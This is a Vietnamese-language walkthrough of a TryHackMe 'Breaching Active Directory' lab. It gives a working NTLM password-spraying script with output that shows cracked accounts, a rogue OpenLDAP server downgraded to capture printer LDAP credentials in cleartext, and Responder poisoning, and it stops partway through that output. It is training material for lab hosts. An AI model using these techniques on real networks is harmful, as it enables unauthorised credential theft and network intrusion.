# Breaching Active Directory

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

## NTLM Authenticated Services

### NTLM and NetNTLM

**NTLM (New Technology LAN Manager)** là bộ giao thức bảo mật dùng để xác thực danh tính người dùng trong **Active Directory**.

NTLM có thể xác thực bằng cơ chế **challenge-response**, gọi là **NetNTLM**. Cơ chế này được nhiều dịch vụ mạng sử dụng. Một số dịch vụ dùng NetNTLM có thể bị đưa ra Internet, ví dụ:

* Máy chủ **Exchange/Outlook Web App (OWA)**.
* Dịch vụ **RDP** mở ra Internet.
* Các cổng **VPN** tích hợp với AD.
* Ứng dụng web public có dùng **Windows/NTLM Authentication**.

**NetNTLM** còn được gọi là **Windows Authentication** hoặc **NTLM Authentication**. Trong quá trình này, ứng dụng đóng vai trò trung gian giữa client và Active Directory.

Ứng dụng không tự xác thực trực tiếp user, mà chuyển thông tin xác thực dạng **challenge-response** đến **Domain Controller**. Nếu Domain Controller xác nhận thành công, ứng dụng sẽ cho user đăng nhập.

Điều này giúp ứng dụng **không cần lưu credential của AD**, vì thông tin đăng nhập chỉ nên được lưu trên **Domain Controller**.

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

### Brute-force Login Attacks

Như đã nói ở Task 2, các dịch vụ AD bị mở ra Internet là nơi phù hợp để kiểm tra credential thu thập được từ nguồn khác. Ngoài ra, chúng cũng có thể bị dùng để tìm credential AD hợp lệ ban đầu.

Ví dụ, nếu trong quá trình recon thu thập được danh sách email hợp lệ, attacker có thể thử đăng nhập vào các dịch vụ này.

Tuy nhiên, hầu hết môi trường AD đều có cơ chế **account lockout**, nên không thể brute-force nhiều mật khẩu trên một tài khoản. Thay vào đó, attacker thường dùng **password spraying**.

Bạn được cung cấp một danh sách username thu thập được trong quá trình **OSINT** của Red Team. Quá trình OSINT cũng phát hiện mật khẩu khởi tạo ban đầu của tổ chức có vẻ là **“Changeme123”**.

Mặc dù người dùng nên đổi mật khẩu ban đầu, nhưng thực tế nhiều người thường quên làm điều đó. Vì vậy, bài lab sẽ dùng một script tùy chỉnh để thực hiện **password spraying** đối với ứng dụng web tại:

```
http://ntlmauth.za.tryhackme.com
```

Khi truy cập URL này, ta thấy trang web yêu cầu thông tin đăng nhập bằng **Windows Authentication**.

<div align="center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5f18e5326d5a50d656d1827221bdcac7.png" alt=""></div>

**Lưu ý:** Plugin Windows Authentication của Firefox rất dễ lỗi. Nếu muốn kiểm tra credential thủ công, nên dùng **Chrome**.

Có thể dùng công cụ như **Hydra** để hỗ trợ password spraying, nhưng trong nhiều trường hợp tự viết script sẽ tốt hơn vì kiểm soát được quá trình rõ hơn.

```python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

Bài lab cung cấp sẵn một script Python cơ bản để thực hiện **password spraying**. Hàm chính của script nhận vào:

* Mật khẩu cần thử.
* URL mục tiêu.

Sau đó, script sẽ lần lượt thử đăng nhập vào website bằng từng username trong file danh sách.

Cách script xác định credential hợp lệ là dựa vào **HTTP status code**:

* Nếu đăng nhập thành công, website trả về mã **200 OK**.
* Nếu đăng nhập thất bại, website trả về mã **401 Unauthorized**.

Nói ngắn gọn: **script thử một mật khẩu trên nhiều username và dựa vào phản hồi HTTP để biết tài khoản nào đăng nhập thành công.**

### Password Spraying

Cú pháp chạy script:

```
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
```

Các tham số cần dùng:

* `<userfile>`: file chứa danh sách username → `usernames.txt`
* `<fqdn>`: tên miền đầy đủ của tổ chức mục tiêu → `za.tryhackme.com`
* `<password>`: mật khẩu dùng để thử password spraying → `Changeme123`
* `<attackurl>`: URL của ứng dụng hỗ trợ Windows Authentication → `http://ntlmauth.za.tryhackme.com`

Lệnh hoàn chỉnh trong lab sẽ là:

```
python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com
```

```bash
(base) ┌──(kali㉿kali)-[~/Downloads/passwordsprayer-1647011410194]
└─$ python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: samantha.thompson
[-] Failed login with Username: dawn.turner
[-] Failed login with Username: frances.chapman
[-] Failed login with Username: henry.taylor
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[-] Failed login with Username: louise.talbot
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[-] Failed login with Username: dominic.elliott
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[-] Failed login with Username: alan.jones
[-] Failed login with Username: frank.fletcher
[-] Failed login with Username: maria.sheppard
[-] Failed login with Username: sophie.blackburn
[-] Failed login with Username: dawn.hughes
[-] Failed login with Username: henry.black
[-] Failed login with Username: joanne.davies
[-] Failed login with Username: mark.oconnor
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 4 valid credential pairs found
                                                                          
```

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>





## LDAP Bind Credentials

### LDAP

Một phương thức xác thực khác trong AD là **LDAP (**&#x4C;ightweight Directory Access Protoco&#x6C;**) Authentication**.

LDAP Authentication khá giống NTLM, nhưng khác ở chỗ: với LDAP, ứng dụng **trực tiếp kiểm tra credential của user**. Ứng dụng thường có sẵn một cặp credential AD để truy vấn LDAP, sau đó dùng LDAP để xác minh thông tin đăng nhập của user.

LDAP Authentication thường được dùng trong các ứng dụng bên thứ ba tích hợp với AD, ví dụ:

* GitLab
* Jenkins
* Web app tự phát triển
* Máy in
* VPN

Nếu các ứng dụng này bị public ra Internet, chúng cũng có thể bị tấn công tương tự như các hệ thống dùng NTLM Authentication.

Tuy nhiên, vì dịch vụ dùng LDAP cần có một bộ credential AD riêng để hoạt động, nên nó tạo thêm rủi ro: attacker có thể cố gắng lấy credential AD mà dịch vụ đang dùng để truy cập vào AD.

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Nếu attacker có được quyền truy cập ban đầu vào đúng máy chủ, ví dụ như **GitLab server**, họ có thể chỉ cần đọc các file cấu hình để tìm credential AD.

Những credential này thường được lưu dưới dạng **plain text** trong file cấu hình. Lý do là mô hình bảo mật thường dựa vào việc bảo vệ **vị trí lưu trữ và quyền truy cập file cấu hình**, thay vì mã hóa nội dung bên trong file.

Các file cấu hình sẽ được giải thích kỹ hơn ở \[Task 7&#x20;Configuration Files]

### LDAP Pass-back Attacks

Một kiểu tấn công đáng chú ý khác đối với cơ chế **LDAP Authentication** là **LDAP Pass-back attack**.

Kiểu tấn công này thường nhắm vào các thiết bị mạng như **máy in**, đặc biệt khi attacker đã có quyền truy cập ban đầu vào mạng nội bộ, ví dụ cắm một thiết bị lạ vào phòng họp.

LDAP Pass-back có thể xảy ra khi attacker truy cập được vào phần cấu hình của thiết bị, nơi lưu các thông số LDAP. Ví dụ: giao diện web quản trị của máy in mạng.

Thông thường, tài khoản đăng nhập giao diện quản trị của các thiết bị này vẫn để mặc định như:

```
admin:admin or admin:password
```

Trong nhiều trường hợp, attacker không thể xem trực tiếp mật khẩu LDAP vì nó bị ẩn. Tuy nhiên, họ có thể chỉnh sửa cấu hình LDAP, chẳng hạn thay đổi địa chỉ IP hoặc hostname của LDAP server.

Trong LDAP Pass-back attack, attacker đổi địa chỉ LDAP server sang máy của mình, rồi bấm kiểm tra cấu hình LDAP. Khi đó, thiết bị sẽ cố gắng xác thực LDAP đến máy giả mạo của attacker. Attacker có thể chặn lần xác thực này để thu được credential LDAP.

Nói ngắn gọn: **LDAP Pass-back lợi dụng thiết bị cấu hình LDAP sai hoặc bảo mật yếu để ép thiết bị gửi credential LDAP về máy của attacker.**

### &#xD;

### Performing an LDAP Pass-back&#xD; &#xD;

There is a network printer in this network where the administration website does not even require credentials. Navigate to [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx) to find the settings page of the printer:

<div align="center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b2ab520a2601299ed9bf74d50168ca7d.png" alt=""></div>

Using browser inspection, we can also verify that the printer website was at least secure enough to not just send the LDAP password back to the browser:

<div align="center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c7cfe0419d3ebe9534d4caefcd1a5511.png" alt=""></div>



Vậy là ta có **username** nhưng chưa có **password**. Khi bấm **Test Settings**, thiết bị sẽ gửi yêu cầu xác thực đến **Domain Controller** để kiểm tra credential LDAP.

Ta có thể lợi dụng điều này bằng cách đổi LDAP server sang IP của mình, khiến máy in kết nối về máy ta thay vì Domain Controller. Khi đó credential có thể bị lộ.

Để kiểm tra máy in có kết nối về không, dùng Netcat lắng nghe trên port mặc định của LDAP là **389**:

```
nc -lvp 389
```

<figure><img src="../../.gitbook/assets/image (878).png" alt=""><figcaption></figcaption></figure>

### &#xD;

```bash
(base) ┌──(kali㉿kali)-[~]
└─$ nc -lvp 389                    
listening on [any] 389 ...
10.200.70.201: inverse host lookup failed: Unknown host
connect to [10.150.70.17] from (UNKNOWN) [10.200.70.201] 53919
0�Dc�;

x�
  objectclass0�supportedCapabilities0�P0�Fc�=

x�
  objectclass0�supportedSASLMechanisms0P

```

Bạn có thể phải thử nhiều lần mới nhận được kết nối trả về, nhưng thường nó sẽ phản hồi trong khoảng **5 giây**.

Phản hồi **supportedCapabilities** cho thấy có một vấn đề: trước khi máy in gửi credential, nó sẽ cố gắng **thương lượng phương thức xác thực LDAP** với server.

Quá trình thương lượng này giúp máy in chọn phương thức xác thực an toàn nhất mà cả máy in và LDAP server đều hỗ trợ. Nếu phương thức xác thực quá an toàn, credential sẽ **không được gửi dưới dạng cleartext**. Với một số phương thức, credential thậm chí **không được truyền qua mạng**.

Vì vậy, ta không thể chỉ dùng **Netcat** thông thường để thu credential. Thay vào đó, cần tạo một **LDAP server giả mạo** và cấu hình nó theo cách không an toàn để buộc credential được gửi dưới dạng **plaintext**.

### Hosting a Rogue LDAP Server



Có nhiều cách để dựng một LDAP server giả mạo, nhưng trong ví dụ này sẽ dùng OpenLDAP.



Nếu dùng máy tấn công riêng, cần cài OpenLDAP bằng lệnh:

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

Tuy nhiên, dù dùng AttackBox, bạn vẫn cần tự cấu hình LDAP server giả mạo.

Bắt đầu bằng cách cấu hình lại LDAP server với lệnh:

```
sudo dpkg-reconfigure -p low slapd
```

Khi được hỏi có muốn bỏ qua cấu hình server không, hãy chọn **No**.

<p align="center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/97afd26fd4f6d10a2a86ab65ac401845.png" alt=""><br></p>

For the DNS domain name, you want to provide our target domain, which is `za.tryhackme.com`:

<p align="center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/01b0d4256900cbf48d8d082d8bdf14bb.png" alt=""><br></p>

Use this same name for the Organisation name as well:<br>

<p align="center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c4bef0c3f054c32ca982ee9c1608ba1b.png" alt=""><br></p>

Provide any Administrator password:

<div align="center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/23b957d41ddba8060e4bc2295b56a2fb.png" alt=""></div>

Select MDB as the LDAP database to use:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/07af572567aa32e0e0be2b4d9f54b89a.png)

For the last two options, ensure the database is not removed when purged:

<p align="center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4d5086da7b25a6f218d6eebdab6d3b71.png" alt=""><br></p>

Move old database files before a new one is created:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d383582606e776eb901650ac9799cef5.png)<br>

Trước khi dùng **LDAP server giả mạo**, ta cần làm cho nó “yếu” hơn bằng cách hạ cấp các cơ chế xác thực được hỗ trợ. Mục tiêu là để LDAP server chỉ hỗ trợ hai phương thức xác thực **PLAIN** và **LOGIN**.

Để làm vậy, tạo file **LDIF** tên:

```
olcSaslSecProps.ldif
```

với nội dung:

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

Ý nghĩa các thuộc tính:

* **olcSaslSecProps**: cấu hình thuộc tính bảo mật của SASL.
* **noanonymous**: tắt cơ chế đăng nhập ẩn danh.
* **minssf=0**: cho phép mức bảo mật tối thiểu là 0, tức là không có bảo vệ.
* **passcred**: cho phép truyền credential.

Sau đó dùng file LDIF này để chỉnh cấu hình LDAP server:

```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

Kiểm tra cấu hình đã áp dụng chưa bằng lệnh:

```
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

Nếu thành công, kết quả sẽ hiển thị LDAP server chỉ hỗ trợ:

```
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```



### Capturing LDAP Credentials&#xD;<br>

LDAP server giả mạo của chúng ta đã được cấu hình xong.

Khi bấm **“Test Settings”** tại:

```
http://printer.za.tryhackme.com/settings.aspx
```

quá trình xác thực sẽ diễn ra dưới dạng **cleartext**.

Nếu bạn cấu hình đúng rogue LDAP server và nó đã hạ cấp cơ chế giao tiếp thành công, bạn sẽ nhận được lỗi:

```
This distinguished name contains invalid syntax
```

Nếu thấy lỗi này, nghĩa là cấu hình đã hoạt động. Sau đó, bạn có thể dùng **tcpdump** để bắt gói tin và xem credential được gửi qua mạng bằng lệnh được cung cấp ở phần tiếp theo.

```bash
(base) ┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -SX -i breachad tcp port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes

06:01:22.123418 IP 10.200.70.201.57305 > 10.150.70.17.ldap: Flags [SEW], seq 1396513233, win 64240, options [mss 1287,nop,wscale 8,nop,nop,sackOK], length 0
        0x0000:  4502 0034 1585 4000 7f06 4405 0ac8 46c9  E..4..@...D...F.
        0x0010:  0a96 4611 dfd9 0185 533d 19d1 0000 0000  ..F.....S=......
        0x0020:  80c2 faf0 8367 0000 0204 0507 0103 0308  .....g..........
        0x0030:  0101 0402                                ....
06:01:22.123737 IP 10.150.70.17.ldap > 10.200.70.201.57305: Flags [S.], seq 690576025, ack 1396513234, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 10], length 0
        0x0000:  4500 0034 0000 4000 4006 988c 0a96 4611  E..4..@.@.....F.
        0x0010:  0ac8 46c9 0185 dfd9 2929 5a99 533d 19d2  ..F.....))Z.S=..
        0x0020:  8012 faf0 ffa4 0000 0204 05b4 0101 0402  ................
        0x0030:  0103 030a                                ....
06:01:22.529169 IP 10.200.70.201.57305 > 10.150.70.17.ldap: Flags [.], ack 690576026, win 1025, length 0
        0x0000:  4500 0028 1587 4000 7f06 4411 0ac8 46c9  E..(..@...D...F.
        0x0010:  0a96 4611 dfd9 0185 533d 19d2 2929 5a9a  ..F.....S=..))Z.
        0x0020:  5010 0401 376a 0000                      P...7j..
06:01:22.529804 IP 10.200.70.201.57305 > 10.150.70.17.ldap: Flags [P.], seq 1396513234:1396513308, ack 690576026, win 1025, length 74
        0x0000:  4500 0072 1588 4000 7f06 43c6 0ac8 46c9  E..r..@...C...F.
        0x0010:  0a96 4611 dfd9 0185 533d 19d2 2929 5a9a  ..F.....S=..))Z.
        0x0020:  5018 0401 f0dc 0000 3084 0000 0044 0201  P.......0....D..
        0x0030:  0663 8400 0000 3b04 000a 0100 0a01 0002  .c....;.........
        0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
        0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
        0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
        0x0070:  6573                                     es
06:01:22.530052 IP 10.150.70.17.ldap > 10.200.70.201.57305: Flags [.], ack 1396513308, win 63, length 0
        0x0000:  4500 0028 3a85 4000 4006 5e13 0a96 4611  E..(:.@.@.^...F.
        0x0010:  0ac8 46c9 0185 dfd9 2929 5a9a 533d 1a1c  ..F.....))Z.S=..
        0x0020:  5010 003f 3ae2 0000                      P..?:...
06:01:22.539001 IP 10.150.70.17.ldap > 10.200.70.201.57305: Flags [P.], seq 690576026:690576037, ack 1396513308, win 63, length 11
        0x0000:  4500 0033 3a86 4000 4006 5e07 0a96 4611  E..3:.@.@.^...F.
        0x0010:  0ac8 46c9 0185 dfd9 2929 5a9a 533d 1a1c  ..F.....))Z.S=..
        0x0020:  5018 003f fe2c 0000 3009 0201 0664 0404  P..?.,..0....d..
        0x0030:  0030 00                                  .0.
06:01:22.539228 IP 10.150.70.17.ldap > 10.200.70.201.57305: Flags [P.], seq 690576037:690576051, ack 1396513308, win 63, length 14
        0x0000:  4500 0036 3a87 4000 4006 5e03 0a96 4611  E..6:.@.@.^...F.
        0x0010:  0ac8 46c9 0185 dfd9 2929 5aa5 533d 1a1c  ..F.....))Z.S=..
        0x0020:  5018 003f f244 0000 300c 0201 0665 070a  P..?.D..0....e..
        0x0030:  0100 0400 0400                           ......
06:01:22.735929 IP 10.200.70.201.57305 > 10.150.70.17.ldap: Flags [.], ack 690576051, win 1025, length 0
        0x0000:  4500 0028 1589 4000 7f06 440f 0ac8 46c9  E..(..@...D...F.
        0x0010:  0a96 4611 dfd9 0185 533d 1a1c 2929 5ab3  ..F.....S=..))Z.
        0x0020:  5010 0401 3707 0000                      P...7...
06:01:22.936075 IP 10.200.70.201.57305 > 10.150.70.17.ldap: Flags [P.], seq 1396513308:1396513384, ack 690576051, win 1025, length 76
        0x0000:  4500 0074 158a 4000 7f06 43c2 0ac8 46c9  E..t..@...C...F.
        0x0010:  0a96 4611 dfd9 0185 533d 1a1c 2929 5ab3  ..F.....S=..))Z.
        0x0020:  5018 0401 b637 0000 3084 0000 0046 0201  P....7..0....F..
        0x0030:  0763 8400 0000 3d04 000a 0100 0a01 0002  .c....=.........
        0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
        0x0050:  636c 6173 7330 8400 0000 1904 1773 7570  class0.......sup
        0x0060:  706f 7274 6564 5341 534c 4d65 6368 616e  portedSASLMechan
        0x0070:  6973 6d73                                isms
06:01:22.937505 IP 10.150.70.17.ldap > 10.200.70.201.57305: Flags [P.], seq 690576051:690576105, ack 1396513384, win 63, length 54
        0x0000:  4500 005e 3a88 4000 4006 5dda 0a96 4611  E..^:.@.@.]...F.
        0x0010:  0ac8 46c9 0185 dfd9 2929 5ab3 533d 1a68  ..F.....))Z.S=.h
        0x0020:  5018 003f 66d1 0000 3034 0201 0764 2f04  P..?f...04...d/.
        0x0030:  0030 2b30 2904 1773 7570 706f 7274 6564  .0+0)..supported
        0x0040:  5341 534c 4d65 6368 616e 6973 6d73 310e  SASLMechanisms1.
        0x0050:  0405 4c4f 4749 4e04 0550 4c41 494e       ..LOGIN..PLAIN
06:01:22.937734 IP 10.150.70.17.ldap > 10.200.70.201.57305: Flags [P.], seq 690576105:690576119, ack 1396513384, win 63, length 14
        0x0000:  4500 0036 3a89 4000 4006 5e01 0a96 4611  E..6:.@.@.^...F.
        0x0010:  0ac8 46c9 0185 dfd9 2929 5ae9 533d 1a68  ..F.....))Z.S=.h
        0x0020:  5018 003f f0b4 0000 300c 0201 0765 070a  P..?....0....e..
        0x0030:  0100 0400 0400                           ......
06:01:23.109984 IP 10.200.70.201.57305 > 10.150.70.17.ldap: Flags [.], ack 690576119, win 1025, length 0
        0x0000:  4500 0028 158b 4000 7f06 440d 0ac8 46c9  E..(..@...D...F.
        0x0010:  0a96 4611 dfd9 0185 533d 1a68 2929 5af7  ..F.....S=.h))Z.
        0x0020:  5010 0401 3677 0000                      P...6w..
06:01:23.347685 IP 10.200.70.201.57305 > 10.150.70.17.ldap: Flags [P.], seq 1396513384:1396513458, ack 690576119, win 1025, length 74
        0x0000:  4500 0072 158c 4000 7f06 43c2 0ac8 46c9  E..r..@...C...F.
        0x0010:  0a96 4611 dfd9 0185 533d 1a68 2929 5af7  ..F.....S=.h))Z.
        0x0020:  5018 0401 ede9 0000 3084 0000 0044 0201  P.......0....D..
        0x0030:  0863 8400 0000 3b04 000a 0100 0a01 0002  .c....;.........
        0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
        0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
        0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
        0x0070:  6573                                     es
06:01:23.349552 IP 10.150.70.17.ldap > 10.200.70.201.57305: Flags [P.], seq 690576119:690576130, ack 1396513458, win 63, length 11
        0x0000:  4500 0033 3a8a 4000 4006 5e03 0a96 4611  E..3:.@.@.^...F.
        0x0010:  0ac8 46c9 0185 dfd9 2929 5af7 533d 1ab2  ..F.....))Z.S=..
        0x0020:  5018 003f fb39 0000 3009 0201 0864 0404  P..?.9..0....d..
        0x0030:  0030 00                                  .0.
06:01:23.349741 IP 10.150.70.17.ldap > 10.200.70.201.57305: Flags [P.], seq 690576130:690576144, ack 1396513458, win 63, length 14
        0x0000:  4500 0036 3a8b 4000 4006 5dff 0a96 4611  E..6:.@.@.]...F.
        0x0010:  0ac8 46c9 0185 dfd9 2929 5b02 533d 1ab2  ..F.....))[.S=..
        0x0020:  5018 003f ef51 0000 300c 0201 0865 070a  P..?.Q..0....e..
        0x0030:  0100 0400 0400                           ......
06:01:23.464590 IP 10.200.70.201.57305 > 10.150.70.17.ldap: Flags [.], ack 690576144, win 1025, length 0
        0x0000:  4500 0028 158d 4000 7f06 440b 0ac8 46c9  E..(..@...D...F.
        0x0010:  0a96 4611 dfd9 0185 533d 1ab2 2929 5b10  ..F.....S=..))[.
        0x0020:  5010 0401 3614 0000                      P...6...
06:01:23.651666 IP 10.200.70.201.57305 > 10.150.70.17.ldap: Flags [P.], seq 1396513458:1396513524, ack 690576144, win 1025, length 66
        0x0000:  4500 006a 158e 4000 7f06 43c8 0ac8 46c9  E..j..@...C...F.
        0x0010:  0a96 4611 dfd9 0185 533d 1ab2 2929 5b10  ..F.....S=..))[.
        0x0020:  5018 0401 5c67 0000 3084 0000 003c 0201  P...\g..0....<..
        0x0030:  0960 8400 0000 3302 0103 0404 4e54 4c4d  .`....3.....NTLM
        0x0040:  8a28 4e54 4c4d 5353 5000 0100 0000 0782  .(NTLMSSP.......
        0x0050:  08a2 0000 0000 0000 0000 0000 0000 0000  ................
        0x0060:  0000 0a00 6345 0000 000f                 ....cE....
06:01:23.653512 IP 10.150.70.17.ldap > 10.200.70.201.57305: Flags [P.], seq 690576144:690576168, ack 1396513524, win 63, length 24
        0x0000:  4500 0040 3a8c 4000 4006 5df4 0a96 4611  E..@:.@.@.]...F.
        0x0010:  0ac8 46c9 0185 dfd9 2929 5b10 533d 1af4  ..F.....))[.S=..
        0x0020:  5018 003f ef1d 0000 3016 0201 0961 110a  P..?....0....a..
        0x0030:  0122 0400 040a 696e 7661 6c69 6420 444e  ."....invalid.DN

```

<figure><img src="../../.gitbook/assets/image (879).png" alt=""><figcaption></figcaption></figure>

```bash
sudo tcpdump -A -s 0 -i breachad tcp port 389
```

<figure><img src="../../.gitbook/assets/image (880).png" alt=""><figcaption></figcaption></figure>



## Authentication Relays

{% file src="../../.gitbook/assets/passwordlist-1647876320267.txt" %}

Tiếp tục với các cuộc tấn công có thể thực hiện từ thiết bị giả mạo trong mạng, phần này sẽ tập trung vào các giao thức xác thực mạng rộng hơn.

Trong mạng Windows, có rất nhiều dịch vụ giao tiếp với nhau để người dùng có thể sử dụng tài nguyên mạng. Các dịch vụ này cần dùng cơ chế xác thực tích hợp sẵn để kiểm tra danh tính của các kết nối đến.

Ở Task 2, ta đã tìm hiểu **NTLM Authentication** trên một ứng dụng web. Trong task này, ta sẽ đi sâu hơn để xem quá trình xác thực đó trông như thế nào ở góc nhìn mạng.

Tuy nhiên, phần này sẽ tập trung vào **NetNTLM authentication được sử dụng bởi SMB**.

### Server Message Block&#xD; &#xD;

**SMB (Server Message Block)** là giao thức cho phép client, như máy trạm, giao tiếp với server, như file share. Trong mạng dùng Microsoft AD, SMB được dùng cho nhiều việc như chia sẻ file nội bộ, quản trị từ xa, thậm chí cả thông báo từ máy in.

Tuy nhiên, các phiên bản SMB cũ có bảo mật yếu. Nhiều lỗ hổng từng bị khai thác để lấy credential hoặc thậm chí thực thi mã trên thiết bị. Dù các phiên bản mới đã vá nhiều lỗi, nhiều tổ chức vẫn phải dùng SMB cũ vì hệ thống legacy không hỗ trợ bản mới.

Phần này sẽ học 2 kiểu tấn công liên quan đến **NetNTLM authentication qua SMB**:

1. **Chặn NTLM Challenge** rồi crack offline để tìm mật khẩu. Tuy nhiên, cách này chậm hơn nhiều so với crack NTLM hash trực tiếp.
2. Dùng thiết bị giả mạo để thực hiện **Man-in-the-Middle**, relay xác thực SMB giữa client và server. Nếu thành công, attacker có thể có một phiên xác thực hợp lệ để truy cập server mục tiêu.



### LLMNR, NBT-NS, and WPAD&#xD;

> The Link-Local Multicast Name Resolution (LLMNR) is a protocol based on the Domain Name System (DNS) packet format that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local link.

Trong task này, ta sẽ xem quá trình xác thực xảy ra khi dùng **SMB**. Công cụ **Responder** sẽ được dùng để cố gắng chặn **NetNTLM challenge** rồi đem đi crack.

Trên mạng Windows thường có rất nhiều yêu cầu xác thực dạng này. Đôi khi do bản ghi DNS cũ hoặc sai, các yêu cầu xác thực có thể bị gửi nhầm đến thiết bị giả mạo của attacker.

**Responder** cho phép thực hiện tấn công **Man-in-the-Middle** bằng cách đầu độc các phản hồi trong quá trình xác thực NetNTLM. Nó lừa client tin rằng máy attacker chính là server mà client muốn kết nối.

Trong mạng LAN thật, Responder sẽ cố đầu độc các yêu cầu như:

* **LLMNR**
* **NBT-NS**
* **WPAD**

Các giao thức này giúp máy trong cùng mạng nội bộ tự tìm tên host mà không cần hỏi DNS server. Vì các request này được broadcast trong mạng LAN, thiết bị giả mạo cũng có thể nhận được.

Bình thường các request không dành cho máy attacker sẽ bị bỏ qua. Nhưng Responder sẽ lắng nghe chúng và gửi phản hồi giả, nói rằng hostname được hỏi đang trỏ về IP của attacker.

Sau đó, Responder khởi chạy các dịch vụ giả như **SMB**, **HTTP**, **SQL**,… để bắt các kết nối và ép client thực hiện xác thực, từ đó thu thập NetNTLM challenge.

### Intercepting NetNTLM Challenge&#xD; &#xD;

Một điều cần lưu ý là **Responder** về cơ bản cố gắng “thắng” trong một **race condition** bằng cách **poisoning** các connection, nhằm đảm bảo rằng bạn có thể **intercept** được connection đó.

Điều này có nghĩa là Responder thường chỉ giới hạn trong việc **poisoning authentication challenges** trên **local network**.

Vì chúng ta đang kết nối vào network thông qua **VPN**, nên chúng ta chỉ có thể poisoning các **authentication challenges** xảy ra trên VPN network này. Vì lý do đó, bài lab đã mô phỏng một authentication request có thể bị poisoning và nó chạy mỗi **30 phút**.

Điều này có nghĩa là bạn có thể phải chờ một lúc trước khi intercept được **NetNTLM challenge and response**.

Mặc dù Responder có thể intercept và poisoning nhiều authentication requests hơn khi chạy từ một **rogue device** được kết nối trực tiếp vào **LAN** của tổ chức, nhưng cần hiểu rằng hành vi này có thể gây gián đoạn và bị phát hiện.

Khi poisoning authentication requests, các lần network authentication bình thường có thể thất bại. Điều đó có nghĩa là users và services có thể không kết nối được đến đúng hosts hoặc shares mà họ muốn truy cập.

Vì vậy, hãy ghi nhớ điều này khi dùng Responder trong một **security assessment**.

Responder đã được cài sẵn trên AttackBox. Nếu không dùng AttackBox, bạn có thể tải và cài từ repo:

```
https://github.com/lgandx/Responder
```

Chúng ta sẽ chạy Responder trên interface kết nối với VPN:

```
sudo responder -I breachad
```

Nếu bạn dùng AttackBox, không phải tất cả dịch vụ của Responder đều khởi động được vì một số port đã bị dịch vụ khác sử dụng. Tuy nhiên, điều này không ảnh hưởng đến task này.

Responder sẽ lắng nghe các request **LLMNR**, **NBT-NS** hoặc **WPAD** gửi đến. Trên LAN thật, ta thường để Responder chạy một thời gian. Nhưng trong lab này, việc đầu độc được mô phỏng bằng cách để một server cố gắng xác thực đến các máy trong VPN.

Hãy để Responder chạy một lúc, trung bình khoảng **10 phút**, rồi bạn sẽ nhận được một kết nối **SMBv2**. Responder có thể dùng kết nối này để dụ và trích xuất một **NTLMv2-SSP response**. Nó sẽ trông giống như sau:

```bash
(base) ┌──(kali㉿kali)-[~/Responder]
└─$ sudo responder -I breachad
[sudo] password for kali: 
                                         __
